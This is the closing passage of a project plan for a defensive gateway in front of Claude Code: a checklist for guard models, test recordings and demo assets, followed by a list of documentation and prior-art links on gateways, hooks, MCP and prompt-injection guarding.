- [ ] Request HF access to `meta-llama/Llama-Prompt-Guard-2-22M`, pre-download it and export to ONNX int8. Pre-download the fallbacks.
- [ ] `ollama pull` one guard model (≤ 2B). Decide the 11434→11435 move.
- [ ] Record real Claude Code SSE streams (text, tool_use, thinking, ping) as golden files for tests. That needs the gateway running in passthrough-record mode, so it's the first thing to build at H2.
- [ ] Prepare demo assets: a `.env` with fake secrets, a poisoned MCP server, a web page with a hidden injection, a fake card number and PESEL (test values only).

---

## 8. Sources
* Claude Code — LLM gateway overview: https://code.claude.com/docs/en/llm-gateway
* Claude Code — Gateway compatibility guide (endpoints, headers, streaming, feature pass-through, model discovery): https://code.claude.com/docs/en/llm-gateway-protocol
* Claude Code — Connect to a gateway (credential variables, `ANTHROPIC_CUSTOM_HEADERS`, `apiKeyHelper`, nonessential traffic): https://code.claude.com/docs/en/llm-gateway-connect
* Claude Code — Roll out a gateway: https://code.claude.com/docs/en/llm-gateway-rollout
* Claude Code — Hooks reference (events, input/output schemas, exit codes, timeouts, HTTP hooks): https://code.claude.com/docs/en/hooks
* Claude Code — Hooks guide: https://code.claude.com/docs/en/hooks-guide
* Claude Code — Settings and precedence: https://code.claude.com/docs/en/settings · Settings reference: https://code.claude.com/docs/en/settings-reference
* Claude Code — Managed settings (macOS paths, drop-ins): https://code.claude.com/docs/en/managed-settings · Server-managed settings: https://code.claude.com/docs/en/server-managed-settings
* Claude Code — MCP: https://code.claude.com/docs/en/mcp · Managed MCP (managed-mcp.json, allow/deny lists): https://code.claude.com/docs/en/managed-mcp
* Claude Code — Permissions: https://code.claude.com/docs/en/permissions · Sandboxing (network proxy, `httpProxyPort`, credentials): https://code.claude.com/docs/en/sandboxing
* Claude Code — Monitoring / OpenTelemetry: https://code.claude.com/docs/en/monitoring-usage · Env vars: https://code.claude.com/docs/en/env-vars
* MCP 2026-07-28 changelog: https://modelcontextprotocol.io/specification/2026-07-28/changelog
* MCP 2026-07-28 Streamable HTTP (headers, HeaderMismatch, backward compatibility): https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http
* MCP 2025-11-25 transports (legacy sessions): https://modelcontextprotocol.io/specification/2025-11-25/basic/transports
* A2A protocol v1.0 specification: https://a2a-protocol.org/latest/specification/
* Ollama Anthropic compatibility: https://docs.ollama.com/api/anthropic-compatibility
* Trail of Bits, mcp-context-protector (TOFU tool pinning): https://blog.trailofbits.com/2025/07/28/we-built-the-security-layer-mcp-always-needed/
* agentgateway (prior art; MCP/A2A/LLM gateway with CEL): https://agentgateway.dev/
* Llama Prompt Guard 2 (22M/86M) model card: https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-22M
